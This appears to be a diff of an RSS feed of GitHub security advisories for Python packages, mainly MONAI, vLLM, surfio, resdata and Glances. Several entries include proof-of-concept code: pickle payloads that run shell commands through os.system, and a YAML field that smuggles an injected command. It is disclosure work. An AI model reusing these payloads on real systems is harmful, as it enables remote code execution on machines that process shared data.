@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-08-18T20:00:24.976Z</updated>
+    <updated>2026-08-18T20:32:03.814Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,333 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[monai] MONAI: Unsafe deserialization in NumpyReader allows arbitrary code execution via malicious .npy files]]></title>
+        <id>https://github.com/advisories/GHSA-wg9g-w2j2-8pgr</id>
+        <link href="https://github.com/advisories/GHSA-wg9g-w2j2-8pgr"/>
+        <updated>2026-08-18T20:22:43.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>NumpyReader</code> class in <code>monai/data/image_reader.py</code> unconditionally uses <code>np.load(name, allow_pickle=True)</code> (line 1276), enabling arbitrary code execution when loading a crafted <code>.npy</code> or <code>.npz</code> file. This affects all MONAI versions up to and including the latest commit (5b71547). The <code>allow_pickle</code> parameter is hardcoded to <code>True</code> and cannot be overridden by the user (the docstring explicitly states kwargs are accepted "except <code>allow_pickle</code>").</p>
+<h3 id="details">Details</h3>
+<p><strong>Vulnerable code</strong> (<a href="https://github.com/Project-MONAI/MONAI/blob/5b71547/monai/data/image_reader.py#L1276">permalink</a>):</p>
+<pre><code class="language-python"># monai/data/image_reader.py, line 1276, in NumpyReader.read()
+img = np.load(name, allow_pickle=True, **kwargs_)
+</code></pre>
+<p>The <code>NumpyReader</code> is automatically selected by MONAI's <code>LoadImage</code> transform for any file with <code>.npy</code> or <code>.npz</code> extension (see <code>monai/transforms/io/array.py</code> line 68: <code>"numpyreader": NumpyReader</code>). This means the entire standard data pipeline (LoadImage, PersistentDataset, CacheDataset, SmartCacheDataset, etc.) is vulnerable.</p>
+<p>The <code>allow_pickle=True</code> parameter enables Python's pickle protocol during numpy loading. Pickle is known to be unsafe for untrusted data, as it can execute arbitrary code during deserialization via the <code>__reduce__</code> method.</p>
+<p><strong>Compare with safe practices in the same project:</strong></p>
+<p>The MONAI project has already addressed similar deserialization issues in other code paths:</p>
+<ul>
+<li><code>torch.load</code> calls now use <code>weights_only=True</code> (after GHSA-6vm5-6jv9-rjpj)</li>
+<li><code>PersistentDataset</code> defaults to <code>weights_only=True</code> (line 272-275 of dataset.py)</li>
+</ul>
+<p>However, <code>NumpyReader</code> was not included in these security improvements.</p>
+<p>Additionally, the <code>NPZDataset</code> class in the same project correctly uses the default <code>allow_pickle=False</code> (<a href="https://github.com/Project-MONAI/MONAI/blob/5b71547/monai/data/dataset.py#L1433">permalink</a>):</p>
+<pre><code class="language-python"># monai/data/dataset.py, line 1433 — safe usage
+dat = np.load(npzfile)  # allow_pickle defaults to False
+</code></pre>
+<p>This inconsistency shows that <code>NumpyReader</code> was overlooked during security hardening.</p>
+<p><strong>The user cannot override this behavior:</strong></p>
+<pre><code class="language-python"># monai/data/image_reader.py, line 1233 (docstring)
+# kwargs: additional args for `numpy.load` API except `allow_pickle`.
+</code></pre>
+<p>The hardcoded <code>allow_pickle=True</code> on line 1276 overrides any user attempt to set it via kwargs.</p>
+<p><strong>Data flow:</strong></p>
+<ol>
+<li>User creates a data pipeline with <code>LoadImage</code> transform or uses any MONAI dataset class</li>
+<li>A <code>.npy</code> or <code>.npz</code> file is provided as input (e.g., as part of a shared medical dataset)</li>
+<li><code>LoadImage</code> selects <code>NumpyReader</code> based on file extension</li>
+<li><code>NumpyReader.read()</code> calls <code>np.load(name, allow_pickle=True)</code></li>
+<li>Malicious pickle payload in the <code>.npy</code> file executes arbitrary code</li>
+</ol>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""PoC: RCE via NumpyReader allow_pickle=True in MONAI"""
+import os
+import tempfile
+import numpy as np
+
+class MaliciousPayload:
+    def __reduce__(self):
+        return (os.system, ('echo "MONAI NumpyReader RCE - Code executed" &gt; /tmp/monai_rce_proof.txt',))
+
+tmpdir = tempfile.mkdtemp(prefix="monai_poc_")
+malicious_npy = os.path.join(tmpdir, "malicious_mask.npy")
+np.save(malicious_npy, np.array(MaliciousPayload()), allow_pickle=True)
+
+# With MONAI installed:
+from monai.data.image_reader import NumpyReader
+reader = NumpyReader()
+data = reader.read(malicious_npy)
+
+# Verify RCE
+proof = "/tmp/monai_rce_proof.txt"
+if os.path.exists(proof):
+    print(f"[!] CODE EXECUTION CONFIRMED: {open(proof).read().strip()}")
+    os.remove(proof)
+
+os.remove(malicious_npy)
+os.rmdir(tmpdir)
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>[!] CODE EXECUTION CONFIRMED: MONAI NumpyReader RCE - Code executed
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>An attacker can achieve arbitrary code execution on any machine running MONAI by:</p>
+<ol>
+<li><p><strong>Dataset poisoning</strong>: Placing a malicious <code>.npy</code> file in a shared medical imaging dataset (e.g., on a shared filesystem, HuggingFace, or research data repository). When a researcher loads the dataset through MONAI's standard pipeline, arbitrary code executes.</p>
+</li>
+<li><p><strong>Supply chain attack</strong>: Contributing a malicious <code>.npy</code> file to a MONAI tutorial, example, or bundle that other users download and run.</p>
+</li>
+<li><p><strong>Lateral movement in medical environments</strong>: In hospital/research settings where MONAI processes shared data, an attacker with access to the data directory can achieve code execution on the processing server.</p>
+</li>
+</ol>
+<p>This is particularly severe in medical/healthcare contexts where MONAI is deployed, as it could lead to compromise of systems handling protected health information (PHI).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-wg9g-w2j2-8pgr">https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-wg9g-w2j2-8pgr</a></li>
+<li><a href="https://github.com/Project-MONAI/MONAI/pull/8875">https://github.com/Project-MONAI/MONAI/pull/8875</a></li>
+<li><a href="https://github.com/Project-MONAI/MONAI/releases/tag/1.6.0">https://github.com/Project-MONAI/MONAI/releases/tag/1.6.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-wg9g-w2j2-8pgr">https://github.com/advisories/GHSA-wg9g-w2j2-8pgr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wg9g-w2j2-8pgr</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-18T20:22:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[MONAI] MONAI vulnerable to OS command injection]]></title>
+        <id>https://github.com/advisories/GHSA-rghg-q7wp-9767</id>
+        <link href="https://github.com/advisories/GHSA-rghg-q7wp-9767"/>
+        <updated>2026-08-18T20:22:40.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="comment-from-jpcertcc">Comment from JPCERT/CC</h3>
+<p>We are submitting the report again as we have yet to receive
+any responses from you after submitting it on February 5 and March 11.</p>
+<p>It would be greatly appreciated if you could send us a message
+after confirming it so that we can follow up the case by email.</p>
+<h3 id="summary">Summary</h3>
+<p>MONAI vulnerable to OS command injection.</p>
+<h3 id="details">Details</h3>
+<p>This library concatenates user-controlled values (YAML's
+"dataset_name_or_id" or part of "CLI/kwargs")
+without quoting or validation. Since this string is passed to subprocess
+with shell=True,
+shell metacharacters (e.g., Windows: &amp; / Linux: ;) are interpreted.</p>
+<p>As a result, arbitrary commands can be concatenated and executed.
+Therefore, the reporter identifies this as CWE-78 (OS Command Injection).</p>
+<p>The victim needs to load a crafted YAML file in the code that launches
+training/validation jobs
+based on the configuration (YAML/arguments). There are no other constraints.</p>
+<h3 id="poc">PoC</h3>
+<p>Verified on Windows.
+Load a modified YAML file with crafted "dataset_name_or_id" as follows.
+Add command separator characters (such as &amp; or ;) and insert arbitrary
+commands.</p>
+<p>dataset_name_or_id: '4 &amp; echo "This is exploited" &gt;
+"C:\Users\shima\OneDrive\Desktop\tmp\test.txt" &amp; rem'
+dataroot: C:/Users/shima/OneDrive/Desktop/tmp/data
+datalist: C:/Users/shima/OneDrive/Desktop/tmp/lists/task4.json
+work_dir: C:/Users/shima/OneDrive/Desktop/tmp/work
+nnunet_raw: C:/Users/shima/OneDrive/Desktop/tmp/nnUNet_raw
+nnunet_preprocessed: C:/Users/shima/OneDrive/Desktop/tmp/nnUNet_preprocessed
+nnunet_results: C:/Users/shima/OneDrive/Desktop/tmp/nnUNet_results</p>
+<p>As a victim, verify running the following Python code to load and
+process the YAML file.</p>
+<p>from monai.apps.nnunet.nnunetv2_runner import nnUNetV2Runner
+from pathlib import Path
+#Path of the crafted YAML file
+YAML = r"C:\Users\shima\OneDrive\Desktop\tmp\test.yaml"
+#Text file overwritten when command executes
+OUT  = Path(r"C:\Users\shima\OneDrive\Desktop\tmp\test.txt")
+#Read YAML
+runner = nnUNetV2Runner(input_config=YAML,
+trainer_class_name="nnUNetTrainer")
+runner.train_single_model(config="3d_fullres", fold=0, gpu_id=0)
+#Verify command execution
+print("Result:", OUT.read_text(encoding="utf-8").strip())</p>
+<p>Also, see the attached file.
+<a href="https://github.com/user-attachments/files/26231614/JVN.50379904-details.zip">JVN#50379904-details.zip</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-rghg-q7wp-9767">https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-rghg-q7wp-9767</a></li>
+<li><a href="https://github.com/Project-MONAI/MONAI/pull/8885">https://github.com/Project-MONAI/MONAI/pull/8885</a></li>
+<li><a href="https://github.com/Project-MONAI/MONAI/releases/tag/1.6.0">https://github.com/Project-MONAI/MONAI/releases/tag/1.6.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-rghg-q7wp-9767">https://github.com/advisories/GHSA-rghg-q7wp-9767</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rghg-q7wp-9767</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-18T20:22:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[monai] Incomplete Fix in MONAI: algo_from_pickle() pickle.loads() RCE still present in v1.5.2 despite GHSA-89gg-p5r5-q6r4 claiming      patch]]></title>
+        <id>https://github.com/advisories/GHSA-qxq5-qhx6-94qw</id>
+        <link href="https://github.com/advisories/GHSA-qxq5-qhx6-94qw"/>
+        <updated>2026-08-18T20:22:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>  GHSA-89gg-p5r5-q6r4 claims the pickle deserialization vulnerability in
+  <code>algo_from_pickle()</code> was fixed in v1.5.2. However, <code>monai/auto3dseg/utils.py</code>
+  has not been modified since 2024-07-12 — 18 months before v1.5.2 was released
+  (2026-01-29). All three <code>pickle.loads()</code> calls remain unchanged. The fix was
+  never implemented.</p>
+<h2 id="vulnerable-code">Vulnerable Code</h2>
+<p>  File: <code>monai/auto3dseg/utils.py</code> (last commit: 2024-07-12, unchanged in v1.5.2)</p>
+<pre><code class="language-python">def algo_from_pickle(pkl_filename: str, ...):
+    with open(pkl_filename, "rb") as f_pi:
+        data_bytes = f_pi.read()
+    data = pickle.loads(data_bytes)          # SINK 1 — line 321, RCE fires here
+
+    # isinstance/key checks happen AFTER deserialization — already too late
+
+    algo_bytes = data.pop("algo_bytes")
+    ...
+    if len(template_paths_candidates) == 0:
+        algo = pickle.loads(algo_bytes)      # SINK 2 — line 350
+    else:
+        for p in template_paths_candidates:
+            algo = pickle.loads(algo_bytes)  # SINK 3 — line 356
+
+No Unpickler subclass, no find_class restriction, no allowlist.
+
+Why the Fix is Incomplete
+
+- monai/auto3dseg/utils.py last commit: 2024-07-12 ("drop python 3.8")
+- v1.5.2 released: 2026-01-29 — release notes contain no pickle-related changes
+- v1.5.1 and v1.5.2 contain identical code at lines 321, 350, 356
+- GHSA-89gg-p5r5-q6r4 references a Zip Slip fix (unrelated) as the patch
+
+PoC
+
+import pickle, os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('id &gt; /tmp/rce_proof.txt',))
+
+# Craft malicious pkl
+data = {"algo_bytes": pickle.dumps(Exploit()), "template_path": None}
+with open("/tmp/evil.pkl", "wb") as f:
+    f.write(pickle.dumps(data))
+
+# Trigger — monai/auto3dseg/utils.py lines 319-350 verbatim
+with open("/tmp/evil.pkl", "rb") as f:
+    data = pickle.loads(f.read())        # SINK 1 fires — RCE here
+algo = pickle.loads(data["algo_bytes"])  # SINK 2 fires
+
+print(open("/tmp/rce_proof.txt").read())
+# uid=1000(user) gid=1000(user) groups=...
+
+Verified on monai v1.5.2 (utils.py verbatim source):
+[+] RCE CONFIRMED via algo_from_pickle():
+    desktop-5657tb1\woong
+
+Impact
+
+Any application or ML pipeline calling algo_from_pickle() with an
+attacker-supplied file path is vulnerable to full RCE. Medical AI workflows
+frequently exchange model checkpoints, making this a realistic attack vector.
+### References
+
+- &lt;https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-qxq5-qhx6-94qw&gt;
+- &lt;https://github.com/Project-MONAI/MONAI/releases/tag/1.6.0&gt;
+- &lt;https://github.com/advisories/GHSA-89gg-p5r5-q6r4&gt;
+- &lt;https://github.com/advisories/GHSA-qxq5-qhx6-94qw&gt;
+</code></pre>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qxq5-qhx6-94qw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-18T20:22:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vllm] vLLM is vulnerable to an Out-of-Memory (OOM) Denial of Service (DoS) attack due to unbounded frame count processing in the `VideoMediaIO.load_base64()` method]]></title>
+        <id>https://github.com/advisories/GHSA-wcwg-c5fc-9vrc</id>
+        <link href="https://github.com/advisories/GHSA-wcwg-c5fc-9vrc"/>
+        <updated>2026-08-18T20:16:48.000Z</updated>
+        <content type="html"><![CDATA[<p>vLLM versions 0.8.0 and later are vulnerable to an Out-of-Memory (OOM) Denial of Service (DoS) attack due to unbounded frame count processing in the <code>VideoMediaIO.load_base64()</code> method. When processing <code>video/jpeg</code> data URLs, the method splits the base64 data string on commas to extract individual JPEG frames without enforcing a frame count limit. An attacker can exploit this by crafting a single API request containing thousands of comma-separated base64-encoded JPEG frames in a data URL, causing the server to decode all frames into memory and crash due to excessive memory consumption. This vulnerability is reachable via the OpenAI-compatible chat completions API and does not require authentication.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5497">https://nvd.nist.gov/vuln/detail/CVE-2026-5497</a></li>
+<li><a href="https://github.com/vllm-project/vllm/commit/58ee61422169ce17e08248f8efa1e9df434fe395">https://github.com/vllm-project/vllm/commit/58ee61422169ce17e08248f8efa1e9df434fe395</a></li>
+<li><a href="https://huntr.com/bounties/7bd92629-b396-4449-8f88-6c0092530eb4">https://huntr.com/bounties/7bd92629-b396-4449-8f88-6c0092530eb4</a></li>
+<li><a href="https://access.redhat.com/security/cve/CVE-2026-5497">https://access.redhat.com/security/cve/CVE-2026-5497</a></li>
+<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2487813">https://bugzilla.redhat.com/show_bug.cgi?id=2487813</a></li>
+<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-5497.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-5497.json</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:33524">https://access.redhat.com/errata/RHSA-2026:33524</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:33531">https://access.redhat.com/errata/RHSA-2026:33531</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2026-2302.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2026-2302.yaml</a></li>
+<li><a href="https://github.com/advisories/GHSA-wcwg-c5fc-9vrc">https://github.com/advisories/GHSA-wcwg-c5fc-9vrc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wcwg-c5fc-9vrc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-11T12:32:44.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[surfio] surfio has an out-of-bounds read]]></title>
+        <id>https://github.com/advisories/GHSA-rcr2-hggw-43wm</id>
+        <link href="https://github.com/advisories/GHSA-rcr2-hggw-43wm"/>
+        <updated>2026-08-18T20:12:56.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Prior to version 0.0.19, surfio would not correctly validate size fields in irap files, leading to a buffer overflow . The severity rating assumes that surfio is used to parse untrused files in a networking context such as a web service.</p>
+<h3 id="patches">Patches</h3>
+<p>The bug has been patched in version 0.0.19</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/equinor/surfio/security/advisories/GHSA-rcr2-hggw-43wm">https://github.com/equinor/surfio/security/advisories/GHSA-rcr2-hggw-43wm</a></li>
+<li><a href="https://github.com/equinor/surfio/pull/86">https://github.com/equinor/surfio/pull/86</a></li>
+<li><a href="https://github.com/equinor/surfio/commit/1619750bce28e39c4f378d2fb6d28b72380a12aa">https://github.com/equinor/surfio/commit/1619750bce28e39c4f378d2fb6d28b72380a12aa</a></li>
+<li><a href="https://github.com/equinor/surfio/releases/tag/0.0.19">https://github.com/equinor/surfio/releases/tag/0.0.19</a></li>
+<li><a href="https://github.com/advisories/GHSA-rcr2-hggw-43wm">https://github.com/advisories/GHSA-rcr2-hggw-43wm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rcr2-hggw-43wm</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-08-18T20:12:55.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[resdata] resdata has Classic Buffer Overflow, Improper Validation of Array Index, NULL Pointer Dereference and Out-of-bounds Read]]></title>
+        <id>https://github.com/advisories/GHSA-pr85-w493-9w3x</id>
+        <link href="https://github.com/advisories/GHSA-pr85-w493-9w3x"/>
+        <updated>2026-08-18T20:11:05.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Prior to version 6.2.9 resdata would not correctly validate input in GRDECL files. The severity rating assumes that resdata is used to parse untrused files in a networking context such as a webservice.</p>
+<h3 id="patches">Patches</h3>
+<p>The bug has been patched starting with version 6.2.9.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/equinor/resdata/security/advisories/GHSA-pr85-w493-9w3x">https://github.com/equinor/resdata/security/advisories/GHSA-pr85-w493-9w3x</a></li>
+<li><a href="https://github.com/equinor/resdata/releases/tag/6.2.9">https://github.com/equinor/resdata/releases/tag/6.2.9</a></li>
+<li><a href="https://github.com/advisories/GHSA-pr85-w493-9w3x">https://github.com/advisories/GHSA-pr85-w493-9w3x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pr85-w493-9w3x</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-08-18T20:11:04.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[mobsf] MobSF Vulnerable to Arbitrary File Read via Path Traversal in ZIP Uploads]]></title>
         <id>https://github.com/advisories/GHSA-8j49-mmcx-4mp5</id>
@@ -1419,559 +1746,5 @@ n= 4000  format(strip_comments)= 1602.8 ms
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-08-17T17:21:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[glances] Glances: as_dict_secure() Value-Level Bypass Leaks Credentials in URL Values via /api/4/config]]></title>
-        <id>https://github.com/advisories/GHSA-4h34-v6r8-mmjc</id>
-        <link href="https://github.com/advisories/GHSA-4h34-v6r8-mmjc"/>
-        <updated>2026-08-17T17:20:50.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Glances provides <code>as_dict_secure()</code> explicitly designed for unauthenticated API access, with a docstring stating it returns "a sanitised copy of the configuration dict" where "Sensitive keys in remaining sections are replaced by '********'". However, the implementation only checks KEY names against a regex pattern and never inspects VALUE content. The documented <code>[ip]</code> config section supports <code>public_api</code> (URL), <code>public_username</code> (login), and <code>public_password</code> (password). While <code>public_password</code> is correctly masked, both <code>public_api</code> (when containing embedded credentials like <code>https://user:pass@host/</code>) and <code>public_username</code> are returned in full to unauthenticated users via <code>GET /api/4/config</code>.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<p>Glances latest (Docker: <code>nicolargo/glances:latest</code>)</p>
-<h2 id="root-cause">Root Cause</h2>
-<p>In <code>glances/config.py</code>, <code>as_dict_secure()</code>:</p>
-<pre><code class="language-python">_SECURE_SENSITIVE_KEY_RE = re.compile(r"password|token|secret|api_key|apikey|ssl_keyfile", re.IGNORECASE)
-
-def as_dict_secure(self):
-    """Return a sanitised copy of the configuration dict.
-    Intended for unauthenticated API access.
-    - Sensitive keys in remaining sections are replaced by '********'.
-    """
-    sanitized = {}
-    for section, options in self.as_dict().items():
-        if section in _SECURE_BLOCKED_SECTIONS: continue
-        sanitized[section] = {
-            key: "********" if _SECURE_SENSITIVE_KEY_RE.search(key) else value
-            for key, value in options.items()
-        }
-    return sanitized
-</code></pre>
-<p>In <code>glances/outputs/glances_restful_api.py</code>:</p>
-<pre><code class="language-python"># Line 1294
-args_json = self.config.as_dict() if self.args.password else self.config.as_dict_secure()
-</code></pre>
-<p>The <code>[ip]</code> config section documents: <code>public_api</code> (URL), <code>public_username</code> (login), <code>public_password</code> (password).</p>
-<ul>
-<li><code>public_password</code> → matches "password" → masked ✓</li>
-<li><code>public_api</code> → no match → returned in full (contains <code>user:pass@</code> in URL) ✗</li>
-<li><code>public_username</code> → no match → returned in full ✗</li>
-</ul>
-<h2 id="impact">Impact</h2>
-<ul>
-<li>Unauthenticated credential disclosure via <code>GET /api/4/config</code> or <code>GET /api/4/config/ip</code></li>
-<li><code>as_dict_secure()</code> exists specifically to protect credentials in no-auth mode but fails to mask <code>public_username</code> and credential-bearing URLs in <code>public_api</code></li>
-</ul>
-<h2 id="prerequisites">Prerequisites</h2>
-<ul>
-<li>Glances in web server mode without <code>--password</code> (default, no auth)</li>
-<li><code>glances.conf</code> <code>[ip]</code> section with <code>public_api</code> containing embedded credentials and/or <code>public_username</code> set</li>
-</ul>
-<h2 id="environment">Environment</h2>
-<ul>
-<li>Glances latest (Docker: <code>nicolargo/glances:latest</code>)</li>
-<li>Remote Docker lab at <code>http://10.140.200.102:8080</code></li>
-</ul>
-<h2 id="reproduction-steps">Reproduction Steps</h2>
-<pre><code class="language-bash">docker run -d --name glances-test -p 8080:61208 -e GLANCES_OPT='-w' nicolargo/glances:latest
-sleep 20
-docker exec glances-test sed -i 's|public_api=https://ipv4.ipleak.net/json/|public_api=https://admin:secret123@ipv4.ipleak.net/json/|' /etc/glances/glances.conf
-docker exec glances-test sed -i 's|#public_username=&lt;myname&gt;|public_username=myname|' /etc/glances/glances.conf
-docker exec glances-test sed -i 's|#public_password=&lt;mysecret&gt;|public_password=mysecret|' /etc/glances/glances.conf
-docker restart glances-test
-sleep 15
-curl -s "$TARGET/api/4/config/ip"
-# Returns: {"public_api": "https://admin:secret123@...", "public_username": "myname", "public_password": "********"}
-</code></pre>
-<h2 id="evidence">Evidence</h2>
-<p>See <code>C:/Tools/glances-config-leak-evidence.txt</code>.</p>
-<h2 id="dedup-check">Dedup Check</h2>
-<ul>
-<li>GHSA-gfc2-9qmw-w7vh covers CORS but NOT value-level credential leak</li>
-<li>No existing GHSA covers <code>as_dict_secure()</code> value-level filtering gap</li>
-<li>13 published GHSA, none covering this issue</li>
-</ul>
-<h2 id="suggested-remediation">Suggested Remediation</h2>
-<p>Add "username" and "login" to sensitive key pattern, and check values for embedded credentials in URLs.</p>
-<h2 id="disclosure-timeline">Disclosure Timeline</h2>
-<ul>
-<li>2026-07-28: Vulnerability discovered and verified via Docker deployment</li>
-</ul>
-<h2 id="reporter">Reporter</h2>
-<p>GitHub username: Todor</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-4h34-v6r8-mmjc">https://github.com/nicolargo/glances/security/advisories/GHSA-4h34-v6r8-mmjc</a></li>
-<li><a href="https://github.com/nicolargo/glances/commit/8d0f8276c2abd2e9d400bd6c84bdfba0dfcab065">https://github.com/nicolargo/glances/commit/8d0f8276c2abd2e9d400bd6c84bdfba0dfcab065</a></li>
-<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.6">https://github.com/nicolargo/glances/releases/tag/v4.5.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-4h34-v6r8-mmjc">https://github.com/advisories/GHSA-4h34-v6r8-mmjc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4h34-v6r8-mmjc</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-17T17:20:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[glances] Glances: `--disable-config-exec` does not cover on-alert action commands (incomplete fix of CVE-2026-53925)]]></title>
-        <id>https://github.com/advisories/GHSA-59fj-m2j6-hcxh</id>
-        <link href="https://github.com/advisories/GHSA-59fj-m2j6-hcxh"/>
-        <updated>2026-08-17T17:20:38.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>In Glances 4.5.5 the <code>--disable-config-exec</code> flag was extended (GHSA-3vwc-qwhc-3mj7) to stop <code>secure_popen()</code> from
-interpreting the shell operators <code>&amp;&amp;</code>, <code>|</code> and <code>&gt;</code> in <strong>AMP</strong> command values taken from the configuration file. The
-hardening was not applied to the <strong>on-alert action</strong> command path, which reads its command lines from the same
-configuration file. As a result, with <code>--disable-config-exec</code> enabled, a configured alert action that contains <code>&gt;</code>
-(file redirection), <code>&amp;&amp;</code> (chaining) or <code>|</code> (pipe) still has those operators interpreted, allowing arbitrary file
-write / command chaining at the privilege of the glances process when the alert triggers.</p>
-<h2 id="affected-code">Affected code</h2>
-<p><code>glances/actions.py</code> (Glances 4.5.5, latest):</p>
-<pre><code class="language-python">ret = secure_popen(cmd_full)        # line 111 — no allow_operators=, defaults to True
-</code></pre>
-<p>By contrast the AMP modules were fixed:</p>
-<pre><code class="language-python"># glances/amps/default/__init__.py:69
-self.set_result(secure_popen(res, allow_operators=self.allow_operators()).rstrip())
-# glances/amps/systemv/__init__.py:60
-res = secure_popen(self.get('service_cmd'), allow_operators=self.allow_operators())
-</code></pre>
-<h2 id="poc-benign">PoC (benign)</h2>
-<p><code>glances.conf</code>:</p>
-<pre><code class="language-ini">[cpu]
-user_critical=1
-user_critical_action=echo MARKER &gt; /tmp/poc_marker
-</code></pre>
-<p>Run <code>glances --disable-config-exec</code> and generate CPU load. When the cpu <code>user</code> alert reaches CRITICAL, <code>/tmp/poc_marker</code>
-is created — i.e. the <code>&gt;</code> operator was interpreted despite <code>--disable-config-exec</code>. The same <code>&gt;</code> in an <code>[amp_*]</code>
-<code>command</code> value is correctly <em>not</em> interpreted.</p>
-<h2 id="impact">Impact</h2>
-<p>Arbitrary file write (<code>&gt;</code>), command chaining (<code>&amp;&amp;</code>) and pipe (<code>|</code>) from config-defined alert actions, contrary to the
-guarantee of <code>--disable-config-exec</code>. Trust boundary = the glances configuration file.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Pass <code>allow_operators=not args.disable_config_exec</code> from <code>GlancesActions.run()</code> into <code>secure_popen()</code> (GlancesActions
-already holds <code>args</code>).</p>
-<h2 id="credit">Credit</h2>
-<p>Reported via responsible-disclosure incomplete-fix measurement study.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-59fj-m2j6-hcxh">https://github.com/nicolargo/glances/security/advisories/GHSA-59fj-m2j6-hcxh</a></li>
-<li><a href="https://github.com/nicolargo/glances/commit/5c07c0d96423e9d5b9de71dd92e3717c66f504bd">https://github.com/nicolargo/glances/commit/5c07c0d96423e9d5b9de71dd92e3717c66f504bd</a></li>
-<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.6">https://github.com/nicolargo/glances/releases/tag/v4.5.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-59fj-m2j6-hcxh">https://github.com/advisories/GHSA-59fj-m2j6-hcxh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-59fj-m2j6-hcxh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-17T17:20:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[glances] Glances: Incomplete fix of CVE-2026-32608: action-template sanitizer is bypassed by nested stat values (process 'cmdline') → OS command injection]]></title>
-        <id>https://github.com/advisories/GHSA-73wf-9vmv-5pv9</id>
